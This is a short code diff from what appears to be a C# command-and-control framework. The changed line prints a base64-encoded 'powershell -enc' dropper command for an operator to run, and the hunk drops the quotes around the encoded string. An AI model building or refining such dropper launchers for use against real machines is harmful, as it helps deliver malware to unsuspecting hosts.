@@ -110,7 +110,7 @@ namespace Commander.Commands.Laucher
                     caller = BuildDropperCommand.PowershellSSlScript + caller;
                 context.Terminal.WriteLine($"[>] Command : powershell -c \"{caller}\"");
                 string caller64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(caller));
-                context.Terminal.WriteLine($"[>] Command : powershell -enc \"{caller64}\"");
+                context.Terminal.WriteLine($"[>] Command : powershell -enc {caller64}");
             }
 
             context.Terminal.WriteLine($"[+] Direct Script : ");
